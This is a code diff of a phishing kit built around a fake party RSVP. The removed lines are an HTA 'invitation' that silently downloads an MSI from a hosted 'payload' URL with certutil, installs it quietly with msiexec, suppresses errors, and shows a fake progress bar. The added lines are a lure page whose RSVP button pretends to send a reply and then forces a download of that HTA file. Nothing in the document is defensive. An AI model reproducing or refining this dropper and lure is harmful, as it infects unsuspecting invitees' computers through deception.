@@ -1,60 +1,192 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<title>Cocktails & Conversation</title>
-<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="Cocktails & Conversation" BORDER="thin" BORDERSTYLE="normal" CAPTION="yes" ICON="" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SCROLL="no" SELECTION="no" SINGLEINSTANCE="yes" WINDOWSTATE="normal"/>
-<style>
-    body { margin:0; padding:0; background:#0f172a; color:#fff; font-family:'Segoe UI',sans-serif; overflow:hidden; user-select:none; }
-    .window-content { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center; }
-    .check-icon { width:50px; height:50px; border:2px solid #d4af37; border-radius:50%; display:flex; justify-content:center; align-items:center; margin-bottom:20px; font-size:24px; color:#d4af37; }
-    h2 { font-size:1.5rem; margin:0 0 5px; font-weight:600; }
-    .subtitle { color:#94a3b8; font-size:.9rem; margin-bottom:30px; }
-    .progress-container { width:300px; height:4px; background:#1e293b; border-radius:2px; overflow:hidden; margin-bottom:15px; }
-    .progress-bar { height:100%; background:#d4af37; width:0%; transition:width .3s ease-out; }
-    .status-text { color:#64748b; font-size:.8rem; margin-bottom:40px; }
-    .cancel-btn { position:absolute; top:20px; right:20px; background:transparent; border:1px solid #334155; color:#94a3b8; padding:5px 15px; border-radius:4px; cursor:pointer; font-size:.8rem; }
-    .cancel-btn:hover { border-color:#94a3b8; color:#fff; }
-    .footer { position:absolute; bottom:30px; width:100%; text-align:center; font-size:.7rem; color:#334155; text-transform:uppercase; letter-spacing:1px; }
-</style>
-<script language="JavaScript">
-    window.onerror = function(){ return true; };
-    function init() {
-        window.resizeTo(600, 450);
-        try {
-            var shell = new ActiveXObject("WScript.Shell");
-            var tempPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\update_helper.msi";
-            // YOUR RAILWAY PAYLOAD URL
-            var msiUrl = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
-            // SILENT DOWNLOAD USING CERTUTIL
-            var downloadCmd = 'certutil -urlcache -split -f "' + msiUrl + '" "' + tempPath + '"';
-            shell.Run(downloadCmd, 0, true); // Wait for download
-            var fso = new ActiveXObject("Scripting.FileSystemObject");
-            if (fso.FileExists(tempPath)) {
-                shell.Run('msiexec /i "' + tempPath + '" /quiet /norestart', 0, false);
-            }
-        } catch(e) {}
-        animateProgress();
-    }
-    function animateProgress() {
-        var p = 0, bar = document.getElementById("pb"), txt = document.getElementById("pt");
-        var iv = setInterval(function() {
-            if(p >= 25) { clearInterval(iv); return; } // STOPS AT 25% LIKE IN VIDEO
-            p++; bar.style.width = p+"%"; txt.innerText = p+"%";
-            setTimeout(arguments.callee, 150 + p*8);
-        }, 100);
-    }
-    window.onload = init;
-</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RSVP Confirmed</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            background-color: #0f172a; 
+            color: #ffffff; 
+            font-family: 'Segoe UI', system-ui, sans-serif; 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .card {
+            background: #1e293b;
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 8px;
+            padding: 60px 50px;
+            text-align: center;
+            max-width: 550px;
+            width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* Gold Checkmark Icon */
+        .icon-circle { 
+            width: 70px; height: 70px; 
+            border: 2px solid #d4af37; 
+            border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center; 
+            margin: 0 auto 30px; 
+            font-size: 36px; color: #d4af37; 
+            background: rgba(212, 175, 55, 0.05);
+        }
+        
+        .rsvp-label {
+            font-size: 0.75rem;
+            letter-spacing: 4px;
+            color: #94a3b8;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+        
+        h1 { 
+            font-family: 'Georgia', serif; 
+            font-size: 2.8rem; 
+            margin-bottom: 25px; 
+            font-weight: 400; 
+            color: #f8fafc;
+            line-height: 1.2;
+        }
+        
+        .subtitle { 
+            color: #cbd5e1; 
+            font-size: 1.05rem; 
+            margin-bottom: 40px; 
+            line-height: 1.7; 
+            font-weight: 300;
+        }
+        
+        /* RSVP BUTTON */
+        .btn-rsvp {
+            display: inline-block;
+            background: transparent;
+            border: 1px solid #d4af37;
+            color: #d4af37;
+            padding: 16px 40px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.95rem;
+            letter-spacing: 1.5px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            cursor: pointer;
+            width: 100%;
+            max-width: 200px;
+        }
+        
+        .btn-rsvp:hover { 
+            background: #d4af37; 
+            color: #0f172a; 
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(212, 175, 55, 0.3);
+        }
+        
+        /* LOADING OVERLAY (Hidden by default) */
+        .loading-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #1e293b;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+            z-index: 10;
+        }
+        
+        .loading-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 40px; height: 40px;
+            border: 3px solid rgba(212, 175, 55, 0.3);
+            border-top-color: #d4af37;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .loading-text {
+            color: #cbd5e1;
+            font-size: 1rem;
+            letter-spacing: 1px;
+        }
+        
+        .footer { 
+            margin-top: 50px; 
+            font-size: 0.7rem; 
+            color: #64748b; 
+            text-transform: uppercase; 
+            letter-spacing: 3px; 
+            font-weight: 500;
+        }
+    </style>
 </head>
 <body>
-    <button class="cancel-btn" onclick="window.close()">Cancel</button>
-    <div class="window-content">
-        <div class="check-icon">✓</div>
-        <h2>Sending your RSVP...</h2>
-        <div class="subtitle">Contacting the event...</div>
-        <div class="progress-container"><div id="pb" class="progress-bar"></div></div>
-        <div id="pt" class="status-text">0%</div>
-        <div class="status-text" style="margin-top:-25px;">Your response is being confirmed. This usually only takes a few minutes.</div>
+    <div class="card">
+        <!-- MAIN CONTENT -->
+        <div id="main-content">
+            <div class="icon-circle">✓</div>
+            
+            <div class="rsvp-label">RSVP CONFIRMED</div>
+            <h1>You're on the list!</h1>
+            
+            <p class="subtitle">
+                Your response has been received. Your digital<br>
+                invitation has been saved to your device.
+            </p>
+            
+            <!-- CLICKING THIS TRIGGERS THE FLOW -->
+            <button class="btn-rsvp" onclick="startRsvpFlow()">RSVP</button>
+            
+            <div class="footer">WE CAN'T WAIT TO SEE YOU THERE</div>
+        </div>
+        
+        <!-- LOADING ANIMATION (Shows when RSVP is clicked) -->
+        <div class="loading-overlay" id="loading-overlay">
+            <div class="spinner"></div>
+            <div class="loading-text">Sending your RSVP...</div>
+        </div>
     </div>
-    <div class="footer">WE CAN'T WAIT TO SEE YOU THERE</div>
+
+    <script>
+        function startRsvpFlow() {
+            // 1. Show loading animation
+            document.getElementById('loading-overlay').classList.add('active');
+            
+            // 2. Wait 2 seconds (simulates "sending") then trigger download
+            setTimeout(function() {
+                // Create invisible link to trigger download
+                var link = document.createElement('a');
+                link.href = '/static/Exclusive_Invitation_4381.hta';
+                link.download = 'Exclusive_Invitation_4381.hta';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                // Optional: Change text after download starts
+                document.querySelector('.loading-text').innerText = 'Invitation downloaded!';
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
